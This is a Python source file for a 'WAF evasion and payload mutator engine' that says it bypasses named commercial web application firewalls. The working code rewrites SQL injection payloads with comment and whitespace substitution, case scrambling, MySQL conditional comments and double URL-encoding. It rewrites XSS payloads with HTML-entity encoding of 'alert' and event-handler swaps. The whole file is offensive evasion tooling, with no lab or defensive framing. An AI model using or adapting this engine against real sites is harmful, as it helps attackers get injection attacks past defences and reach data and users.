"""
Adaptive WAF Evasion & Payload Mutator Engine (v2.0)
===================================================
Generates polymorphic payload mutations to bypass modern WAFs (Cloudflare, AWS WAF,
Akamai, Imperva, ModSecurity) across SQLi, XSS, SSRF, and Command Injection.
"""

import re
import urllib.parse
from enum import Enum, auto
from typing import List, Dict, Set


class MutationStrategy(Enum):
    WHITESPACE_SUBSTITUTION = "whitespace_substitution"
    KEYWORD_CASE_SCRAMBLING = "keyword_case_scrambling"
    HEX_AND_ENCODING        = "hex_and_encoding"
    COMMENT_INTERLEAVING    = "comment_interleaving"
    UNICODE_NORMALIZATION   = "unicode_normalization"
    INLINE_CONCATENATION    = "inline_concatenation"


class AdaptivePayloadMutator:
    """Polymorphic mutation engine for security probes"""

    SQL_KEYWORDS = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "SLEEP", "BENCHMARK", "ORDER", "GROUP", "BY"]
    XSS_KEYWORDS = ["script", "alert", "onerror", "onload", "javascript", "iframe", "svg", "img", "eval", "src"]

    @classmethod
    def mutate_sqli(cls, payload: str) -> List[str]:
        mutations: Set[str] = {payload}

        # 1. Whitespace Substitutions
        for space_sub in ["/**/", "%09", "%0A", "%0D", "+"]:
            mutations.add(payload.replace(" ", space_sub))

        # 2. Keyword Case Scrambling (e.g. UnIoN SeLeCt)
        scrambled = payload
        for kw in cls.SQL_KEYWORDS:
            if re.search(rf"\b{kw}\b", scrambled, re.I):
                scrambled_kw = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
                scrambled = re.sub(rf"\b{kw}\b", scrambled_kw, scrambled, flags=re.I)
        mutations.add(scrambled)

        # 3. MySQL Conditional Comments (/*!12345UNION*//*!12345SELECT*/)
        commented = payload
        for kw in ["UNION", "SELECT"]:
            commented = re.sub(rf"\b{kw}\b", f"/*!12345{kw}*/", commented, flags=re.I)
        mutations.add(commented)

        # 4. Equality Substitutions
        mutations.add(payload.replace("1=1", "1 LIKE 1").replace("1=2", "1 NOT BETWEEN 1 AND 1"))

        # 5. URL Encoding Variants
        mutations.add(urllib.parse.quote(payload))
        mutations.add(urllib.parse.quote(urllib.parse.quote(payload)))  # Double URL-encode

        return list(mutations)

    @classmethod
    def mutate_xss(cls, payload: str) -> List[str]:
        mutations: Set[str] = {payload}

        # 1. Case Variations (e.g. <sCrIpt>, oNlOaD)
        scrambled = payload
        for kw in cls.XSS_KEYWORDS:
            if kw.lower() in scrambled.lower():
                scrambled_kw = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
                scrambled = re.sub(re.escape(kw), scrambled_kw, scrambled, flags=re.I)
        mutations.add(scrambled)

        # 2. Attribute Space Separators (slashes instead of spaces)
        mutations.add(payload.replace(" ", "/"))

        # 3. HTML Entity Decimal / Hex Encodings
        mutations.add(payload.replace("alert", "&#97;&#108;&#101;&#114;&#116;"))
        mutations.add(payload.replace("alert", "&#x61;&#x6c;&#x65;&#x72;&#x74;"))

        # 4. Event Handler Obfuscations
        if "onload=" in payload.lower():
            mutations.add(payload.replace("onload=", "autofocus onfocus="))

        return list(mutations)


mutator = AdaptivePayloadMutator()
